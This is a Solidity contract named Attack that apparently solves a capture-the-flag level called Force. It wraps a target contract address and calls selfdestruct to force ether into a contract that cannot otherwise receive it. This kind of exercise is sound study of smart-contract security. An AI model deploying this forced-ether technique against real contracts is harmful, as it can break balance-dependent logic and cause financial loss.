// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Force} from "./Force.sol";

contract Attack {
     Force public force;

     constructor(Force _force) payable{
          force = _force;
     }

     function sendMoney() public payable {
          selfdestruct(payable(address(force)));
     }

     receive() external payable{
          sendMoney();
     }

}